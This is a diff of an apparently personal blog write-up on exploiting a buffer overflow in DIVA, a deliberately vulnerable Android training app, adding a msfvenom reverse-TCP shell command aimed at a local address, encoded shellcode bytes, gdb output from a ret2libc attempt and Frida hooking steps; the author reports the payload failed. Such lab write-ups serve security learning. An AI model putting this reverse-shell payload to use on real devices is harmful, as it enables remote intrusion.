@@ -148,19 +148,19 @@ tuvwxyz{|}~
 <br>As you can see everything is properly aligned and we found no bad characters in it, apart from the hex we didn’t use that will eventually come in bad characters
 <br>Bad character:-
 <br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-<br>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\
-<br>x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x
+<br>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16
+<br>\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x
 <br>8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa
 <br>4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb
 <br>\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3
-<br>\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\
-<br>xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+<br>\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea
+<br>\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
 <br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 <br>**MSF**
 <br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 <br>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.103 LPORT:4455 -a x86 -b 
-<br>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\
-<br>x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x
+<br>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16
+<br>\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x
 <br>8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa
 <br>4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb
 <br>\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3
@@ -169,13 +169,110 @@ tuvwxyz{|}~
 <br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 <br>![14-40](https://teckk2.github.io/assets/images/DIVA/14-40.png)
 <br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-<p>\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x34\x34\x34\x34\x6a\x58\x41\x51\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39\x75\x34\x4a\x42\x30\x31\x47\x6b\x48\x77\x4b\x33\x71\x43\x6e\x63\x70\x53\x62\x4a\x6a\x62\x75\x39\x79\x51\x78\x30\x30\x66\x78\x4d\x61\x70\x45\x43\x50\x59\x56\x50\x6d\x6f\x38\x4d\x55\x30\x50\x49\x70\x79\x6b\x49\x30\x68\x59\x30\x76\x48\x6b\x51\x4f\x77\x61\x58\x6b\x52\x4b\x50\x4b\x61\x4f\x6c\x65\x39\x48\x61\x44\x70\x63\x36\x32\x30\x52\x31\x50\x53\x66\x53\x39\x73\x74\x49\x47\x71\x68\x4d\x55\x30\x72\x32\x72\x48\x42\x4e\x6c\x6f\x30\x73\x43\x38\x53\x38\x4e\x4f\x4c\x6f\x63\x32\x50\x69\x51\x79\x58\x63\x51\x42\x50\x53\x63\x59\x57\x71\x56\x50\x6a\x6b\x78\x4d\x63\x50\x41\x41</p>
+<br>\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49
+<br>\x41\x49\x41\x49\x41\x49\x41\x34\x34\x34\x34\x6a\x58\x41\x51\x41\x44\x41\x5a\x41\x42
+<br>\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41
+<br>\x5a\x31\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51
+<br>\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41\x5a
+<br>\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39\x75\x34\x4a\x42\x30\x31
+<br>\x47\x6b\x48\x77\x4b\x33\x71\x43\x6e\x63\x70\x53\x62\x4a\x6a\x62\x75\x39\x79\x51\x78
+<br>\x30\x30\x66\x78\x4d\x61\x70\x45\x43\x50\x59\x56\x50\x6d\x6f\x38\x4d\x55\x30\x50\x49
+<br>\x70\x79\x6b\x49\x30\x68\x59\x30\x76\x48\x6b\x51\x4f\x77\x61\x58\x6b\x52\x4b\x50\x4b
+<br>\x61\x4f\x6c\x65\x39\x48\x61\x44\x70\x63\x36\x32\x30\x52\x31\x50\x53\x66\x53\x39\x73
+<br>\x74\x49\x47\x71\x68\x4d\x55\x30\x72\x32\x72\x48\x42\x4e\x6c\x6f\x30\x73\x43\x38\x53
+<br>\x38\x4e\x4f\x4c\x6f\x63\x32\x50\x69\x51\x79\x58\x63\x51\x42\x50\x53\x63\x59\x57\x71
+<br>\x56\x50\x6a\x6b\x78\x4d\x63\x50\x41\x41
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Now invert the payload as we did earlier to generate our ASCII 
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>49414941494149414941494149414941494149414941494149414941343434346a5841514144415a41424
+<br>152414c41594149415141494151414941684141415a3141494149414a3131414941494142414241425149
+<br>3141495149414951493131314149414a5159415a4241424142414241426b4d4147423975344a423031476
+<br>b48774b3371436e637053624a6a627539795178303066784d61704543505956506d6f384d553050497079
+<br>6b493068593076486b514f7761586b524b504b614f6c65394861447063363230523150536653397374494
+<br>771684d553072327248424e6c6f3073433853384e4f4c6f6332506951795863514250536359577156506a
+<br>6b784d63504141
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>But the payload didn’t work as expected, I even disabled the ASLR from the android device, but still no result.
+<br>![14-41](https://teckk2.github.io/assets/images/DIVA/14-41.png)
+<br>[https://simoneaonzo.it/gdb-android/](https://simoneaonzo.it/gdb-android/)
+<br>[https://sourceware.org/gdb/onlinedocs/gdb/Inferiors-and-Programs.html](https://sourceware.org/gdb/onlinedocs/gdb/Inferiors-and-Programs.html)
+<br>[https://wladimir-tm4pda.github.io/porting/debugging_native.html](https://wladimir-tm4pda.github.io/porting/debugging_native.html)
+<br>[https://www.leviathansecurity.com/blog/aslr-protection-for-statically-linked-executables](https://www.leviathansecurity.com/blog/aslr-protection-for-statically-linked-executables)
+<br>[https://www.contextis.com/us/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library](https://www.contextis.com/us/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library)
+<br>[https://www.youtube.com/watch?v=WvPJjQR3LJE](https://www.youtube.com/watch?v=WvPJjQR3LJE)
+<br>[https://www-zeuthen.desy.de/unix/unixguide/infohtml/gdb/Character-Sets.html](https://www-zeuthen.desy.de/unix/unixguide/infohtml/gdb/Character-Sets.html)
+<br>[https://www.utf8-chartable.de/unicode-utf8-table.pl?number=1024&utf8=0x](https://www.utf8-chartable.de/unicode-utf8-table.pl?number=1024&utf8=0x)
+<br>After reading a lot of blogs and trying a lot of different methods, later I realize there is NX (No-Execute) bit enabled in the binary which restrict us from executing anything in stack. 
+<br>Later I even tried Ret2libc but because of the character restriction, we can’t jump to our system address.
+<p class="message">
+  <br>am start -n jakhar.aseem.diva/.InputValidation3Activity (name=jakhar.aseem.diva/jakhar.aseem.diva.InputValidation3Activity)
+  <br>(gdb) find &system,+9999999,"/bin/sh"
+  <br>0xaad6d62e <.L.str.7+7>
+  <br>1 pattern found.
+  <br>/bin/sh = 0xa619a62e
+  <br>/system/bin/sh = 0xa619a627
+</p>
+<br>After trying to find a lot of new methods, we finally decided to stick and focus on [Frida](https://frida.re/docs/android/), [Frida release](https://github.com/frida/frida/releases)
+<br>Let’s download Frida and push it into the device
+<br>![14-42](https://teckk2.github.io/assets/images/DIVA/14-42.png)
+<br>![14-43](https://teckk2.github.io/assets/images/DIVA/14-43.png)
+<br>![14-44](https://teckk2.github.io/assets/images/DIVA/14-44.png)
+<br>I changed the name for our convenience 
+<br>![14-45](https://teckk2.github.io/assets/images/DIVA/14-45.png)
+<br>Now either we can run Frida server directly from outside using adb shell command 
+<br>[adb shell "/data/local/tmp/frida-server &"]
+<br>Or we can go inside the shell and run from there
+<br>![14-46](https://teckk2.github.io/assets/images/DIVA/14-46.png)
+<br>When you run there will be no response or interactive response you will see, which a default nature of Frida.
+<br>To fasten the thing KNX made a small script to ease the things for us or we can as usual try everything manual whatever you feel good
+<br>![14-47](https://teckk2.github.io/assets/images/DIVA/14-47.png)
+<br>The next method we tried was hooking **[SpannableStringBuilder](https://developer.android.com/reference/android/text/SpannableStringBuilder)** and replace the input 
+<br>bytes to the address we want in EIP using Frida, but unfortunately it didn’t work and we face the same utf-8 hex conversion issue.
+<br>As we already know that all the problem is created by that one function which converts our input into UTF-8 so we tried to bypass that
+<br>In detail our issue can be understand by this:
+<br>![14-48](https://teckk2.github.io/assets/images/DIVA/14-48.png)
+<br>Digging deeper with a mix of debugging and hooking we tried to hook a lot of functions before found we find the culprit.
+<br>First Idea was the methods toString() is the root cause of the issue because everytime u try to print an object (like editText.getText()) or u try to concatenate string with editText.getText() INTERNALLY java apply toString() but If it be applied to our string, when we send not ascii bytes, it have to returns empty string (like java tostring official documentation). Sadly it didn't happen.
+<br>At this point we had to pause to understand how android apps work at a low level and how it is possible to run native C code in an app, as we know that it is not possible to exploit a memory corruption vulnerability in a Java application and this means that somehow native code is executed.
+<p class="message">
+  [ JNI is the Java Native Interface. It defines a way for the bytecode that Android compiles from managed code (written in the Java or Kotlin programming languages) to interact with native code (written in C/C++). ]
+</p>
+<br>[https://developer.android.com/training/articles/perf-jni](https://developer.android.com/training/articles/perf-jni)
+<br>Now before we proceed further I would recommend you to do complete this Frida-boot workshop for beginners by **Leon Jacobs**. Which will help us understand the concepts more easily which we are going to perform in later stage. [https://www.youtube.com/watch?v=CLpW1tZCblo](https://www.youtube.com/watch?v=CLpW1tZCblo)
+<br>Now we tried to Reverse the native library
+<br>We unzipped APK again in search of native lib, and we found it: libdivajni.so
+<br>![14-49](https://teckk2.github.io/assets/images/DIVA/14-49.png)
+<br>Then we tried to hook it, first thing we tried to print lib load address with this simple Js script which KNX wrote:
+<br>![14-50](https://teckk2.github.io/assets/images/DIVA/14-50.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {
+<br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libnative_addr is: " + libnative_addr)
+<br>&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 <br>
 <br>
 <br>
 <br>
 <br>
 <br>
+<br>
+<br>
+<br> 
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br> 
 
 <p class="message">
   ~ tavşanı sever
